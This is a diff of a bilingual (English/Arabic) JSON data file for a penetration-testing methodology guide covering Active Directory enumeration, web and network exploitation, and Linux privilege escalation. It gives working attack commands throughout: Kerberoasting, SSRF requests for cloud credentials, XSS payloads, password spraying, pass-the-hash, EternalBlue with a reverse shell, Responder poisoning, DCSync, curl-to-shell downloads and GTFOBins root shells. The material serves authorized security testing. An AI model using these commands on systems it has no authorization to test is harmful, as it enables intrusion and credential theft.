+            "out": {
+              "en": "Domain users, groups, shares, password policy",
+              "ar": "مستخدمو النطاق، المجموعات، المشاركات، سياسة كلمات المرور"
+            }
           },
           {
             "id": "s3c2",
-            "title": "BloodHound + ldapdomaindump",
-            "purpose": "Visual attack path mapping and full LDAP data extraction",
+            "title": {
+              "en": "BloodHound + ldapdomaindump",
+              "ar": "BloodHound + ldapdomaindump"
+            },
+            "purpose": {
+              "en": "Visual attack path mapping and full LDAP data extraction",
+              "ar": "رسم بياني مرئي لمسارات الهجوم واستخراج كامل لبيانات LDAP"
+            },
             "cmd": "# BloodHound data collection:\npip3 install bloodhound --break-system-packages\npython3 bloodhound.py -d {DOMAIN} -u {USER} -p '{PASS}' -dc {DC_IP} -c all -o ~/pentests/{CLIENT}/scans/bloodhound/\nsudo neo4j console && bloodhound &\n# Import JSON files -> run 'Shortest Paths to Domain Admins'\n\n# Full LDAP dump to HTML:\nldapdomaindump ldap://{DC_IP} -u '{DOMAIN}\\\\{USER}' -p '{PASS}' -o ldap/",
             "example": "python3 bloodhound.py -d acme.local -u john.doe -p 'Password123' -dc 192.168.1.10 -c all\nldapdomaindump ldap://192.168.1.10 -u 'ACME\\\\john.doe' -p 'Password123' -o ldap/",
             "flags": [
               {
                 "f": "-c all",
-                "d": "Collect: Users, Groups, LocalAdmin, Sessions, ACL, Trusts"
+                "d": {
+                  "en": "Collect: Users, Groups, LocalAdmin, Sessions, ACL, Trusts",
+                  "ar": "جمع: المستخدمون، المجموعات، المدراء المحليون، الجلسات، ACL، الثقات"
+                }
               },
               {
                 "f": "-d",
-                "d": "Domain FQDN"
+                "d": {
+                  "en": "Domain FQDN",
+                  "ar": "اسم النطاق الكامل (FQDN)"
+                }
               },
               {
                 "f": "-dc",
-                "d": "Domain Controller IP"
+                "d": {
+                  "en": "Domain Controller IP",
+                  "ar": "عنوان IP لوحدة التحكم بالنطاق"
+                }
               }
             ],
-            "note": "On Windows domain host: .\\\\SharpHound.exe -c All --OutputDirectory C:\\\\Temp",
-            "out": "Attack graph to Domain Admin (BloodHound) + HTML tables of all AD objects"
+            "note": {
+              "en": "On Windows domain host: .\\\\SharpHound.exe -c All --OutputDirectory C:\\\\Temp",
+              "ar": "على مضيف نطاق Windows: .\\SharpHound.exe -c All --OutputDirectory C:\\Temp"
+            },
+            "out": {
+              "en": "Attack graph to Domain Admin (BloodHound) + HTML tables of all AD objects",
+              "ar": "رسم بياني للهجوم نحو مدير النطاق (BloodHound) + جداول HTML لجميع كائنات AD"
+            }
           },
           {
             "id": "s3c3",
-            "title": "Kerberoasting + AS-REP Roasting",
-            "purpose": "Get crackable offline hashes \u2014 no network alerts generated",
+            "title": {
+              "en": "Kerberoasting + AS-REP Roasting",
+              "ar": "Kerberoasting + AS-REP Roasting"
+            },
+            "purpose": {
+              "en": "Get crackable offline hashes — no network alerts generated",
+              "ar": "الحصول على هاشات قابلة للكسر دون اتصال — دون توليد تنبيهات شبكة"
+            },
             "cmd": "# Kerberoasting (needs valid credentials):\nimpacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC_IP} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n# AS-REP Roasting (no credentials needed for pre-auth disabled accounts):\nimpacket-GetNPUsers {DOMAIN}/ -usersfile ad_users.txt -no-pass -dc-ip {DC_IP} -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
             "example": "impacket-GetUserSPNs acme.local/john.doe:'Password123' -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt",
             "flags": [
               {
                 "f": "-request",
-                "d": "Request actual TGS tickets (not just list SPNs)"
+                "d": {
+                  "en": "Request actual TGS tickets (not just list SPNs)",
+                  "ar": "طلب تذاكر TGS فعلية (وليس سرد SPN فقط)"
+                }
               },
               {
                 "f": "-m 13100",
-                "d": "hashcat: Kerberos TGS-REP mode"
+                "d": {
+                  "en": "hashcat: Kerberos TGS-REP mode",
+                  "ar": "hashcat: وضع Kerberos TGS-REP"
+                }
               },
               {
                 "f": "-m 18200",
-                "d": "hashcat: Kerberos AS-REP mode"
+                "d": {
+                  "en": "hashcat: Kerberos AS-REP mode",
+                  "ar": "hashcat: وضع Kerberos AS-REP"
+                }
               },
               {
                 "f": "-no-pass",
-                "d": "AS-REP: no credentials needed"
+                "d": {
+                  "en": "AS-REP: no credentials needed",
+                  "ar": "AS-REP: لا حاجة لبيانات اعتماد"
+                }
               }
             ],
-            "note": "Service accounts with SPNs often have elevated AD privileges. One cracked service account can equal Domain Admin directly.",
-            "out": "Crackable hash files \u2014 offline cracking with zero network alerts"
+            "note": {
+              "en": "Service accounts with SPNs often have elevated AD privileges. One cracked service account can equal Domain Admin directly.",
+              "ar": "حسابات الخدمة ذات SPN غالباً ما تملك صلاحيات AD مرتفعة. حساب خدمة واحد مكسور قد يساوي مدير نطاق مباشرة."
+            },
+            "out": {
+              "en": "Crackable hash files — offline cracking with zero network alerts",
+              "ar": "ملفات هاش قابلة للكسر — كسر دون اتصال بمخاطرة تنبيه شبكة صفرية"
+            }
           }
         ],
         "tools": [
@@ -706,79 +1429,163 @@
           "impacket",
           "neo4j"
         ],
-        "deliverable": "AD enumeration with BloodHound attack path screenshots",
-        "tip": "BloodHound 'Shortest Paths to Domain Admins' is the most impactful report visual. A 3-hop graph to DA explains the risk instantly to any audience."
+        "deliverable": {
+          "en": "AD enumeration with BloodHound attack path screenshots",
+          "ar": "حصر AD مع لقطات شاشة لمسارات هجوم BloodHound"
+        },
+        "tip": {
+          "en": "BloodHound 'Shortest Paths to Domain Admins' is the most impactful report visual. A 3-hop graph to DA explains the risk instantly to any audience.",
+          "ar": "خيار 'أقصر المسارات إلى مدراء النطاق' في BloodHound هو أكثر الرسوم تأثيراً في التقرير. رسم بياني من 3 قفزات إلى DA يشرح الخطر فوراً لأي جمهور."
+        }
       }
     ]
   },
   {
     "id": "exploit",
-    "label": "Exploitation",
-    "short": "Exploit",
-    "icon": "\u26a1",
+    "label": {
+      "en": "Exploitation",
+      "ar": "الاستغلال"
+    },
+    "short": {
+      "en": "Exploit",
+      "ar": "استغلال"
+    },
+    "icon": "⚡",
     "color": "#ef4444",
-    "desc": "Controlled, documented exploitation \u2014 prove impact, cause zero harm",
+    "desc": {
+      "en": "Controlled, documented exploitation — prove impact, cause zero harm",
+      "ar": "استغلال مُتحكَّم به وموثَّق — إثبات الأثر دون أي ضرر"
+    },
     "steps": [
       {
         "id": "e1",
-        "title": "Web Application Exploitation",
+        "title": {
+          "en": "Web Application Exploitation",
+          "ar": "استغلال تطبيقات الويب"
+        },
         "priority": "critical",
-        "summary": "Exploit confirmed vulnerabilities with benign, documented proof-of-concept only.",
+        "summary": {
+          "en": "Exploit confirmed vulnerabilities with benign, documented proof-of-concept only.",
+          "ar": "استغلال الثغرات المؤكدة بإثبات مفهوم غير ضار وموثَّق فقط."
+        },
         "checklist": [
-          "SQLi \u2014 DB structure + max 5 sample rows",
-          "Auth bypass \u2014 gain unauthorized access",
-          "XSS \u2014 alert(document.domain) only, never cookie theft",
-          "IDOR \u2014 access another user's resource",
-          "SSRF \u2014 reach cloud metadata or internal service",
-          "JWT \u2014 algorithm confusion or weak secret cracking",
-          "Business logic \u2014 price/access/workflow flaws"
+          {
+            "en": "SQLi — DB structure + max 5 sample rows",
+            "ar": "حقن SQL — بنية قاعدة البيانات + 5 صفوف عينة كحد أقصى"
+          },
+          {
+            "en": "Auth bypass — gain unauthorized access",
+            "ar": "تجاوز المصادقة — الحصول على وصول غير مصرّح به"
+          },
+          {
+            "en": "XSS — alert(document.domain) only, never cookie theft",
+            "ar": "XSS — alert(document.domain) فقط، أبداً سرقة الكوكيز"
+          },
+          {
+            "en": "IDOR — access another user's resource",
+            "ar": "IDOR — الوصول لمورد مستخدم آخر"
+          },
+          {
+            "en": "SSRF — reach cloud metadata or internal service",
+            "ar": "SSRF — الوصول لبيانات تعريف سحابية أو خدمة داخلية"
+          },
+          {
+            "en": "JWT — algorithm confusion or weak secret cracking",
+            "ar": "JWT — التباس الخوارزمية أو كسر سرّ ضعيف"
+          },
+          {
+            "en": "Business logic — price/access/workflow flaws",
+            "ar": "منطق الأعمال — عيوب في السعر/الوصول/سير العمل"
+          }
         ],
         "commands": [
           {
             "id": "e1c1",
-            "title": "SQLMap Full Exploitation",
-            "purpose": "Prove SQL injection with controlled data extraction",
-            "cmd": "# Most reliable \u2014 from Burp saved request:\nsqlmap -r burp_request.txt --dbs --batch\n\n# Direct URL:\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\n\n# Dump table (5 rows max):\nsqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch\n\n# SSRF test payloads:\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/'\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\ncurl '{URL}?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'",
+            "title": {
+              "en": "SQLMap Full Exploitation",
+              "ar": "استغلال كامل عبر SQLMap"
+            },
+            "purpose": {
+              "en": "Prove SQL injection with controlled data extraction",
+              "ar": "إثبات حقن SQL باستخراج بيانات مُتحكَّم به"
+            },
+            "cmd": "# Most reliable — from Burp saved request:\nsqlmap -r burp_request.txt --dbs --batch\n\n# Direct URL:\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\n\n# Dump table (5 rows max):\nsqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch\n\n# SSRF test payloads:\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/'\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\ncurl '{URL}?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'",
             "example": "sqlmap -r burp_login.txt --dbs --batch\ncurl 'https://acmecorp.com/fetch?url=http://169.254.169.254/latest/meta-data/'",
             "flags": [
               {
                 "f": "--stop 5",
-                "d": "CRITICAL: 5 rows max \u2014 never dump full PII"
+                "d": {
+                  "en": "CRITICAL: 5 rows max — never dump full PII",
+                  "ar": "حرِج: 5 صفوف كحد أقصى — لا تُفرغ بيانات شخصية كاملة أبداً"
+                }
               },
               {
                 "f": "-r",
-                "d": "Burp request file \u2014 most reliable"
+                "d": {
+                  "en": "Burp request file — most reliable",
+                  "ar": "ملف طلب من Burp — الأكثر موثوقية"
+                }
               },
               {
                 "f": "--dbs",
-                "d": "List all databases"
+                "d": {
+                  "en": "List all databases",
+                  "ar": "سرد جميع قواعد البيانات"
+                }
               }
             ],
-            "note": "AWS IAM creds at /iam/security-credentials/{role} = usable worldwide. Screenshot = instant critical finding.",
-            "out": "DB structure + sample rows (SQLi) | Cloud IAM creds (SSRF) | Unauthorized data (IDOR)"
+            "note": {
+              "en": "AWS IAM creds at /iam/security-credentials/{role} = usable worldwide. Screenshot = instant critical finding.",
+              "ar": "بيانات اعتماد AWS IAM في /iam/security-credentials/{role} = قابلة للاستخدام عالمياً. لقطة شاشة = نتيجة حرجة فورية."
+            },
+            "out": {
+              "en": "DB structure + sample rows (SQLi) | Cloud IAM creds (SSRF) | Unauthorized data (IDOR)",
+              "ar": "بنية قاعدة البيانات + صفوف عينة (SQLi) | بيانات اعتماد IAM سحابية (SSRF) | بيانات غير مصرّح بها (IDOR)"
+            }
           },
           {
             "id": "e1c2",
-            "title": "XSS + Auth Bypass + JWT",
-            "purpose": "JavaScript execution, authentication bypass, JWT token exploitation",
+            "title": {
+              "en": "XSS + Auth Bypass + JWT",
+              "ar": "XSS + تجاوز المصادقة + JWT"
+            },
+            "purpose": {
+              "en": "JavaScript execution, authentication bypass, JWT token exploitation",
+              "ar": "تنفيذ JavaScript، تجاوز المصادقة، استغلال رمز JWT"
+            },
             "cmd": "# XSS automated scan:\nxsstrike -u '{URL}?q=FUZZ' --crawl\n\n# Manual XSS payloads:\n# <script>alert(document.domain)</script>\n# \"><img src=x onerror=alert(document.domain)>\n# <svg onload=alert(1)>\n\n# Auth bypass in Burp Repeater:\n# {\"role\":\"user\"} -> {\"role\":\"admin\"}\n# {\"isAdmin\":false} -> {\"isAdmin\":true}\n# GET /api/users/1234 -> /api/users/1235 (IDOR)\n\n# JWT attacks:\npython3 jwt_tool.py {TOKEN} -X a\nhashcat -m 16500 {TOKEN} /usr/share/wordlists/rockyou.txt --force",
             "example": "xsstrike -u 'https://acmecorp.com/search?q=FUZZ' --crawl\npython3 jwt_tool.py eyJhbGc... -X a",
             "flags": [
               {
                 "f": "--crawl",
-                "d": "Test all discovered inputs"
+                "d": {
+                  "en": "Test all discovered inputs",
+                  "ar": "اختبار جميع المدخلات المكتشفة"
+                }
               },
               {
                 "f": "-X a",
-                "d": "jwt_tool: alg:none attack"
+                "d": {
+                  "en": "jwt_tool: alg:none attack",
+                  "ar": "jwt_tool: هجوم alg:none"
+                }
               },
               {
                 "f": "-m 16500",
-                "d": "hashcat: JWT HS256 crack"
+                "d": {
+                  "en": "hashcat: JWT HS256 crack",
+                  "ar": "hashcat: كسر JWT HS256"
+                }
               }
             ],
-            "note": "XSS: alert(document.domain) proves JS execution without stealing real user cookies from a live session.",
-            "out": "JS executing in browser + admin access via auth bypass + JWT takeover"
+            "note": {
+              "en": "XSS: alert(document.domain) proves JS execution without stealing real user cookies from a live session.",
+              "ar": "XSS: alert(document.domain) يُثبت تنفيذ JS دون سرقة كوكيز مستخدم حقيقي من جلسة فعلية."
+            },
+            "out": {
+              "en": "JS executing in browser + admin access via auth bypass + JWT takeover",
+              "ar": "JS يعمل في المتصفح + وصول مدير عبر تجاوز المصادقة + استيلاء JWT"
+            }
           }
         ],
         "tools": [
@@ -788,68 +1595,140 @@
           "jwt_tool",
           "curl"
         ],
-        "deliverable": "Exploitation evidence per finding: request + response + business impact + screenshot",
-        "tip": "Prove impact, cause zero harm. 5 DB rows not 5000. alert(1) not cookie theft. The capability screenshot is everything."
+        "deliverable": {
+          "en": "Exploitation evidence per finding: request + response + business impact + screenshot",
+          "ar": "دليل استغلال لكل نتيجة: الطلب + الاستجابة + الأثر على الأعمال + لقطة شاشة"
+        },
+        "tip": {
+          "en": "Prove impact, cause zero harm. 5 DB rows not 5000. alert(1) not cookie theft. The capability screenshot is everything.",
+          "ar": "أثبت الأثر دون أي ضرر. 5 صفوف من قاعدة البيانات وليس 5000. alert(1) وليس سرقة الكوكيز. لقطة شاشة الإمكانية هي كل شيء."
+        }
       },
       {
         "id": "e2",
-        "title": "Network + AD Exploitation",
+        "title": {
+          "en": "Network + AD Exploitation",
+          "ar": "استغلال الشبكة وActive Directory"
+        },
         "priority": "high",
-        "summary": "Credential attacks, CVE exploitation, and full Active Directory attack chain.",
+        "summary": {
+          "en": "Credential attacks, CVE exploitation, and full Active Directory attack chain.",
+          "ar": "هجمات بيانات الاعتماد، استغلال CVE، وسلسلة هجوم Active Directory الكاملة."
+        },
         "checklist": [
-          "Default/weak credentials on ALL services (SSH, FTP, RDP, databases)",
-          "Metasploit CVE exploitation (verify before exploiting)",
-          "Password spraying (check lockout policy first)",
-          "Responder \u2014 LLMNR/NBT-NS poisoning",
-          "Kerberoasting + hash cracking",
-          "DCSync \u2014 dump all domain hashes"
+          {
+            "en": "Default/weak credentials on ALL services (SSH, FTP, RDP, databases)",
+            "ar": "بيانات اعتماد افتراضية/ضعيفة على جميع الخدمات (SSH، FTP، RDP، قواعد البيانات)"
+          },
+          {
+            "en": "Metasploit CVE exploitation (verify before exploiting)",
+            "ar": "استغلال CVE عبر Metasploit (تحقق قبل الاستغلال)"
+          },
+          {
+            "en": "Password spraying (check lockout policy first)",
+            "ar": "رش كلمات المرور (تحقق من سياسة القفل أولاً)"
+          },
+          {
+            "en": "Responder — LLMNR/NBT-NS poisoning",
+            "ar": "Responder — تسميم LLMNR/NBT-NS"
+          },
+          {
+            "en": "Kerberoasting + hash cracking",
+            "ar": "Kerberoasting + كسر الهاش"
+          },
+          {
+            "en": "DCSync — dump all domain hashes",
+            "ar": "DCSync — استخراج جميع هاشات النطاق"
+          }
         ],
         "commands": [
           {
             "id": "e2c1",
-            "title": "Hydra + CrackMapExec Spraying",
-            "purpose": "Credential attacks across network services and AD",
-            "cmd": "# SSH brute force:\nhydra -l {USER} -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://{TARGET} -t 4\n\n# HTTP form:\nhydra -L users.txt -P passwords.txt {TARGET} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 4\n\n# Password spray (one password, many users \u2014 avoids lockout):\ncrackmapexec smb {RANGE} -u ad_users.txt -p 'Password1!' --continue-on-success\n\n# Pass-the-Hash:\ncrackmapexec smb {RANGE} -u Administrator -H {NTLM_HASH} --continue-on-success",
+            "title": {
+              "en": "Hydra + CrackMapExec Spraying",
+              "ar": "رش كلمات المرور عبر Hydra وCrackMapExec"
+            },
+            "purpose": {
+              "en": "Credential attacks across network services and AD",
+              "ar": "هجمات بيانات اعتماد عبر خدمات الشبكة وAD"
+            },
+            "cmd": "# SSH brute force:\nhydra -l {USER} -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://{TARGET} -t 4\n\n# HTTP form:\nhydra -L users.txt -P passwords.txt {TARGET} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 4\n\n# Password spray (one password, many users — avoids lockout):\ncrackmapexec smb {RANGE} -u ad_users.txt -p 'Password1!' --continue-on-success\n\n# Pass-the-Hash:\ncrackmapexec smb {RANGE} -u Administrator -H {NTLM_HASH} --continue-on-success",
             "example": "hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://192.168.1.100 -t 4\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome123!' --continue-on-success",
             "flags": [
               {
                 "f": "-t 4",
-                "d": "4 threads \u2014 keep low to avoid lockouts"
+                "d": {
+                  "en": "4 threads — keep low to avoid lockouts",
+                  "ar": "4 خيوط — أبقها منخفضة لتجنب القفل"
+                }
               },
               {
                 "f": "--continue-on-success",
-                "d": "CME: find all valid creds"
+                "d": {
+                  "en": "CME: find all valid creds",
+                  "ar": "CME: إيجاد جميع بيانات الاعتماد الصالحة"
+                }
               },
               {
                 "f": "-H",
-                "d": "NTLM hash for Pass-the-Hash"
+                "d": {
+                  "en": "NTLM hash for Pass-the-Hash",
+                  "ar": "هاش NTLM لهجوم Pass-the-Hash"
+                }
               }
             ],
-            "note": "Check password lockout policy BEFORE spraying. One password per observation window is the safe limit.",
-            "out": "Valid credentials | (Pwn3d!) = local admin"
+            "note": {
+              "en": "Check password lockout policy BEFORE spraying. One password per observation window is the safe limit.",
+              "ar": "تحقق من سياسة قفل كلمة المرور قبل الرش. كلمة مرور واحدة لكل نافذة مراقبة هو الحد الآمن."
+            },
+            "out": {
+              "en": "Valid credentials | (Pwn3d!) = local admin",
+              "ar": "بيانات اعتماد صالحة | (Pwn3d!) = مدير محلي"
+            }
           },
           {
             "id": "e2c2",
-            "title": "Metasploit + Responder + DCSync",
-            "purpose": "CVE exploitation, NTLMv2 capture, and domain hash extraction",
+            "title": {
+              "en": "Metasploit + Responder + DCSync",
+              "ar": "Metasploit + Responder + DCSync"
+            },
+            "purpose": {
+              "en": "CVE exploitation, NTLMv2 capture, and domain hash extraction",
+              "ar": "استغلال CVE، التقاط NTLMv2، واستخراج هاشات النطاق"
+            },
             "cmd": "# Metasploit workflow:\nmsfconsole -q\nmsf6 > use auxiliary/scanner/smb/smb_ms17_010\nmsf6 > set RHOSTS {TARGET} && run\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS {TARGET} && set LHOST {YOUR_IP}\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp && exploit\n\n# Meterpreter:\nmeterpreter > sysinfo && getuid && screenshot && hashdump\n\n# Responder:\nsudo responder -I eth0 -wvF\nhashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2*.txt /usr/share/wordlists/rockyou.txt --force\n\n# DCSync (requires Domain Admin):\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP}\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt",
             "example": "sudo responder -I eth0 -wvF\nimpacket-secretsdump acme.local/administrator:'Password123'@192.168.1.10",
             "flags": [
               {
                 "f": "-wvF",
-                "d": "responder: WPAD + verbose + force NTLM"
+                "d": {
+                  "en": "responder: WPAD + verbose + force NTLM",
+                  "ar": "responder: WPAD + تفصيلي + فرض NTLM"
+                }
               },
               {
                 "f": "-m 5600",
-                "d": "hashcat: NTLMv2 mode"
+                "d": {
+                  "en": "hashcat: NTLMv2 mode",
+                  "ar": "hashcat: وضع NTLMv2"
+                }
               },
               {
                 "f": "-just-dc-user",
-                "d": "secretsdump: extract only one account"
+                "d": {
+                  "en": "secretsdump: extract only one account",
+                  "ar": "secretsdump: استخراج حساب واحد فقط"
+                }
               }
             ],
-            "note": "krbtgt hash from DCSync = Golden Ticket capability. Screenshot immediately \u2014 this is the crown jewel finding.",
-            "out": "Meterpreter shell + cracked NTLMv2 (Responder) + all domain hashes (DCSync)"
+            "note": {
+              "en": "krbtgt hash from DCSync = Golden Ticket capability. Screenshot immediately — this is the crown jewel finding.",
+              "ar": "هاش krbtgt من DCSync = إمكانية Golden Ticket. التقط لقطة شاشة فوراً — هذه النتيجة الأهم."
+            },
+            "out": {
+              "en": "Meterpreter shell + cracked NTLMv2 (Responder) + all domain hashes (DCSync)",
+              "ar": "صدفة Meterpreter + NTLMv2 مكسور (Responder) + جميع هاشات النطاق (DCSync)"
+            }
           }
         ],
         "tools": [
@@ -860,74 +1739,152 @@
           "Impacket",
           "hashcat"
         ],
-        "deliverable": "Exploitation log: timestamps, commands, systems accessed, credentials found",
-        "tip": "Document as you go, not from memory later. Keep CherryTree open and paste commands + output in real time."
+        "deliverable": {
+          "en": "Exploitation log: timestamps, commands, systems accessed, credentials found",
+          "ar": "سجل الاستغلال: الطوابع الزمنية، الأوامر، الأنظمة المُخترقة، بيانات الاعتماد المكتشفة"
+        },
+        "tip": {
+          "en": "Document as you go, not from memory later. Keep CherryTree open and paste commands + output in real time.",
+          "ar": "وثّق أثناء العمل، وليس من الذاكرة لاحقاً. أبقِ CherryTree مفتوحاً وألصق الأوامر والمخرجات لحظياً."
+        }
       }
     ]
   },
   {
     "id": "postex",
-    "label": "Post-Exploitation",
-    "short": "Post-Ex",
-    "icon": "\ud83c\udff4",
+    "label": {
+      "en": "Post-Exploitation",
+      "ar": "ما بعد الاستغلال"
+    },
+    "short": {
+      "en": "Post-Ex",
+      "ar": "بعد-الاستغلال"
+    },
+    "icon": "🏴",
     "color": "#f59e0b",
-    "desc": "Privilege escalation, credential dumping, lateral movement, cleanup",
+    "desc": {
+      "en": "Privilege escalation, credential dumping, lateral movement, cleanup",
+      "ar": "تصعيد الصلاحيات، استخراج بيانات الاعتماد، الحركة الجانبية، التنظيف"
+    },
     "steps": [
       {
         "id": "pe1",
-        "title": "Linux Privilege Escalation",
+        "title": {
+          "en": "Linux Privilege Escalation",
+          "ar": "تصعيد الصلاحيات على Linux"
+        },
         "priority": "critical",
-        "summary": "Escalate from low-privilege shell to root using automated scans and manual techniques.",
+        "summary": {
+          "en": "Escalate from low-privilege shell to root using automated scans and manual techniques.",
+          "ar": "التصعيد من صدفة منخفضة الصلاحيات إلى root باستخدام فحوصات آلية وتقنيات يدوية."
+        },
         "checklist": [
-          "Run LinPEAS automated scan",
-          "Check sudo -l for exploitable binaries (GTFOBins)",
-          "Hunt SUID/SGID binaries",
-          "Check writable cron jobs",
-          "Check Linux capabilities (getcap -r /)",
-          "Search credentials in configs and shell history"
+          {
+            "en": "Run LinPEAS automated scan",
+            "ar": "تشغيل فحص LinPEAS الآلي"
+          },
+          {
+            "en": "Check sudo -l for exploitable binaries (GTFOBins)",
+            "ar": "فحص sudo -l بحثاً عن ملفات قابلة للاستغلال (GTFOBins)"
+          },
+          {
+            "en": "Hunt SUID/SGID binaries",
+            "ar": "البحث عن ملفات SUID/SGID"
+          },
+          {
+            "en": "Check writable cron jobs",
+            "ar": "فحص مهام cron القابلة للكتابة"
+          },
+          {
+            "en": "Check Linux capabilities (getcap -r /)",
+            "ar": "فحص صلاحيات Linux (getcap -r /)"
+          },
+          {
+            "en": "Search credentials in configs and shell history",
+            "ar": "البحث عن بيانات اعتماد في ملفات الإعداد وسجل الصدفة"
+          }
         ],
         "commands": [
           {
             "id": "pe1c1",
-            "title": "LinPEAS + sudo -l + SUID Hunt",
-            "purpose": "Automated and manual Linux privilege escalation",
+            "title": {
+              "en": "LinPEAS + sudo -l + SUID Hunt",
+              "ar": "LinPEAS + sudo -l + بحث SUID"
+            },
+            "purpose": {
+              "en": "Automated and manual Linux privilege escalation",
+              "ar": "تصعيد صلاحيات Linux آلي ويدوي"
+            },
             "cmd": "# LinPEAS (no file on disk):\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or download + save output:\npython3 -m http.server 8000  # on attacker\nwget http://{YOUR_IP}:8000/linpeas.sh -O /tmp/.lp && chmod +x /tmp/.lp\n/tmp/.lp | tee /tmp/.out.txt\n\n# sudo -l + GTFOBins exploits:\nsudo -l\nsudo vim -c ':!bash'\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\nsudo find / -exec /bin/bash \\; -quit\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# SUID binary hunt:\nfind / -perm -u=s -type f 2>/dev/null\n# Check EACH at: gtfobins.github.io -> SUID section",
             "example": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\nsudo -l  # then check gtfobins.github.io for each binary found",
             "flags": [
               {
                 "f": "-perm -u=s",
-                "d": "SUID bit set \u2014 runs as file owner"
+                "d": {
+                  "en": "SUID bit set — runs as file owner",
+                  "ar": "بت SUID مُفعَّل — يعمل بصلاحيات مالك الملف"
+                }
               },
               {
                 "f": "2>/dev/null",
-                "d": "Suppress permission denied errors"
+                "d": {
+                  "en": "Suppress permission denied errors",
+                  "ar": "إخفاء أخطاء رفض الصلاحية"
+                }
               }
             ],
-            "note": "LinPEAS color code: Bright Red/Yellow = HIGH probability. Focus there. Check every sudo binary at gtfobins.github.io.",
-            "out": "Color-coded PrivEsc vectors + root shell via sudo/SUID exploitation"
+            "note": {
+              "en": "LinPEAS color code: Bright Red/Yellow = HIGH probability. Focus there. Check every sudo binary at gtfobins.github.io.",
+              "ar": "رمز ألوان LinPEAS: أحمر/أصفر فاتح = احتمال مرتفع. ركّز هناك. افحص كل ملف sudo قابل للتنفيذ على gtfobins.github.io."
+            },
+            "out": {
+              "en": "Color-coded PrivEsc vectors + root shell via sudo/SUID exploitation",
+              "ar": "متجهات تصعيد صلاحيات مرمّزة بالألوان + صدفة root عبر استغلال sudo/SUID"
+            }
           },
           {
             "id": "pe1c2",
-            "title": "Credential Hunting on Linux",
-            "purpose": "Find cleartext passwords in configs, history, environment",
+            "title": {
+              "en": "Credential Hunting on Linux",
+              "ar": "البحث عن بيانات اعتماد على Linux"
+            },
+            "purpose": {
+              "en": "Find cleartext passwords in configs, history, environment",
+              "ar": "إيجاد كلمات مرور نصية صريحة في الإعدادات والسجل والبيئة"
+            },
             "cmd": "# Search config files:\ngrep -ria 'password\\|passwd\\|secret\\|api_key\\|db_pass' /var/www/ /opt/ /home/ /etc/ 2>/dev/null | grep -v '.pyc'\n\n# Shell history:\ncat ~/.bash_history ~/.zsh_history 2>/dev/null\n\n# Environment variables:\nenv | grep -iE 'pass|secret|key|token|api'\n\n# Common config files:\nfind / -name '.env' -o -name 'wp-config.php' -o -name 'database.yml' 2>/dev/null | xargs grep -l 'password' 2>/dev/null",
             "example": "grep -ria 'password' /var/www/ /opt/ /home/ 2>/dev/null | grep -v '.pyc'",
             "flags": [
               {
                 "f": "-r",
-                "d": "Recursive search"
+                "d": {
+                  "en": "Recursive search",
+                  "ar": "بحث تكراري"
+                }
               },
               {
                 "f": "-i",
-                "d": "Case insensitive"
+                "d": {
+                  "en": "Case insensitive",
+                  "ar": "غير حساس لحالة الأحرف"
+                }
               },
               {
                 "f": "-a",
-                "d": "Treat binaries as text"
+                "d": {
+                  "en": "Treat binaries as text",
+                  "ar": "معاملة الملفات الثنائية كنص"
+                }
               }
             ],
-            "note": "wp-config.php and .env files are goldmines. Always check the web document root and /opt/.",
-            "out": "Cleartext credentials in config files, history, and environment variables"
+            "note": {
+              "en": "wp-config.php and .env files are goldmines. Always check the web document root and /opt/.",
+              "ar": "ملفات wp-config.php و.env كنوز حقيقية. افحص دائماً جذر مستندات الويب و/opt/."
+            },
+            "out": {
+              "en": "Cleartext credentials in config files, history, and environment variables",
+              "ar": "بيانات اعتماد نصية صريحة في ملفات الإعداد والسجل ومتغيرات البيئة"
+            }
           }
         ],
         "tools": [
@@ -937,72 +1894,147 @@
           "find",
           "grep"
         ],
-        "deliverable": "PrivEsc chain: low-priv to root with each step documented and screenshot",
-        "tip": "LinPEAS colors are everything. Bright red = test first. One sudo rule or SUID binary is all you need to get root."
+        "deliverable": {
+          "en": "PrivEsc chain: low-priv to root with each step documented and screenshot",
+          "ar": "سلسلة تصعيد صلاحيات: من منخفض إلى root مع توثيق كل خطوة ولقطة شاشة"
+        },
+        "tip": {
+          "en": "LinPEAS colors are everything. Bright red = test first. One sudo rule or SUID binary is all you need to get root.",
